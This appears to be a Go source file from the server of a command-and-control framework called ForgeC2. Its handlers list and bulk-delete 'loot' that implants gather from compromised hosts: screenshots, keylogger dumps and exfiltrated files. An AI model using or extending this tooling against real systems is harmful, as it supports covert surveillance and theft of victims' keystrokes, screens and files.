package server

import (
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

type lootScreenshotDTO struct {
	ID        string `json:"id"`
	AgentID   string `json:"agent_id"`
	Filename  string `json:"filename"`
	Path      string `json:"path"`
	CreatedAt string `json:"created_at,omitempty"`
}

type lootTaskDTO struct {
	ID        uint      `json:"id"`
	AgentID   string    `json:"agent_id"`
	Hostname  string    `json:"hostname"`
	Type      string    `json:"type"`
	Command   string    `json:"command"`
	Result    string    `json:"result"`
	Error     string    `json:"error"`
	Status    string    `json:"status"`
	CreatedAt time.Time `json:"created_at"`
}

func newLootScreenshot(agentID, filename string, mod time.Time) lootScreenshotDTO {
	dto := lootScreenshotDTO{
		ID:       "screenshot:" + agentID + ":" + filename,
		AgentID:  agentID,
		Filename: filename,
		Path:     agentID + "/" + filename,
	}
	if !mod.IsZero() {
		dto.CreatedAt = mod.UTC().Format(time.RFC3339)
	}
	return dto
}

func newLootTask(t db.Task) lootTaskDTO {
	return lootTaskDTO{
		ID:        t.ID,
		AgentID:   t.AgentID,
		Hostname:  t.Agent.Hostname,
		Type:      t.Type,
		Command:   t.Command,
		Result:    t.Result,
		Error:     t.Error,
		Status:    t.Status,
		CreatedAt: t.CreatedAt,
	}
}

func lootDataDir(s *Server) string {
	if s.cfg != nil && s.cfg.Server.DataDir != "" {
		return s.cfg.Server.DataDir
	}
	return "data"
}

func mapLootTasks(tasks []db.Task) []lootTaskDTO {
	out := make([]lootTaskDTO, 0, len(tasks))
	for _, t := range tasks {
		out = append(out, newLootTask(t))
	}
	return out
}

// handleLootPage aggregates loot: screenshots, keylogs, downloaded files across all agents
func (s *Server) handleLootPage(c *gin.Context) {
	// Get all agents
	var agents []db.Implant
	if err := s.db.Order("last_seen desc").Limit(LootAgentLimit).Find(&agents).Error; err != nil {
		handleQueryError(c, err, "Failed to query loot agents")
		return
	}

	dataDir := lootDataDir(s)

	var allScreenshots []lootScreenshotDTO
	lootLimit := 500
	screenshotRoot := filepath.Join(dataDir, "screenshots")
	if entries, err := os.ReadDir(screenshotRoot); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			agentDir := filepath.Join(screenshotRoot, e.Name())
			if files, err := os.ReadDir(agentDir); err == nil {
				for _, f := range files {
					if f.IsDir() || !(strings.HasSuffix(f.Name(), ".png") || strings.HasSuffix(f.Name(), ".jpg") || strings.HasSuffix(f.Name(), ".jpeg")) {
						continue
					}
					mod := time.Time{}
					if info, err := f.Info(); err == nil {
						mod = info.ModTime()
					}
					allScreenshots = append(allScreenshots, newLootScreenshot(e.Name(), f.Name(), mod))
					if len(allScreenshots) >= lootLimit {
						break
					}
				}
			}
			if len(allScreenshots) >= lootLimit {
				break
			}
		}
	}

	// Keylogger dumps
	var keylogTasks []db.Task
	if err := s.db.Preload("Agent").
		Where("type = ?", "keylogger_dump").
		Order("created_at desc").Limit(50).Find(&keylogTasks).Error; err != nil {
		handleQueryError(c, err, "Failed to query keylog tasks")
		return
	}

	// Recent file pulls. Exfil is type=upload with no push payload.
	// download_url is the implant fetching a URL onto its own disk — not a teamserver blob.
	var downloadTasks []db.Task
	if err := s.db.Preload("Agent").
		Where("(type = ? AND (data = '' OR data IS NULL)) OR type = ?", "upload", "download").
		Order("created_at desc").Limit(50).Find(&downloadTasks).Error; err != nil {
		handleQueryError(c, err, "Failed to query download tasks")
		return
	}

	stats := s.getNavStats(c)
	data := gin.H{
		"Title":         "ForgeC2 - Loot",
		"ActiveNav":     "loot",
		"Agents":        agents,
		"Screenshots":   allScreenshots,
		"KeylogTasks":   mapLootTasks(keylogTasks),
		"DownloadTasks": mapLootTasks(downloadTasks),
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPageOrJSON(c, data)
}

// handleLootBulkDelete deletes multiple loot items by composite IDs.
// IDs are "screenshot:AGENT:FILE", "keylog:TASK_ID", or "download:TASK_ID".
func (s *Server) handleLootBulkDelete(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	var req struct {
		IDs []string `json:"ids"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || len(req.IDs) == 0 {
		respondError(c, http.StatusBadRequest, "ids array required")
		return
	}

	dataDir := lootDataDir(s)
	screenshotRoot := filepath.Join(dataDir, "screenshots")

	var deleted int
	for _, raw := range req.IDs {
		parts := strings.SplitN(raw, ":", 3)
		if len(parts) < 2 {
			continue
		}
		kind, id := parts[0], parts[1]
		switch kind {
		case "screenshot":
			if len(parts) != 3 {
				continue
			}
			agentDir := parts[1]
			filename := parts[2]
			fp := filepath.Join(screenshotRoot, agentDir, filename)
			if err := validateFilePath(fp, screenshotRoot); err == nil {
				if err := os.Remove(fp); err == nil {
					deleted++
				}
			}
		case "keylog":
			res := s.db.Delete(&db.Task{}, "id = ? AND type IN ?", id, []string{"keylogger_dump", "keylogger_start"})
			if res.Error == nil && res.RowsAffected > 0 {
				deleted++
			}
		case "download":
			res := s.db.Delete(&db.Task{}, "id = ? AND type IN ?", id, []string{"download", "upload"})
			if res.Error == nil && res.RowsAffected > 0 {
				deleted++
			}
		}
	}
	respond(c, gin.H{"success": true, "deleted": deleted})
}
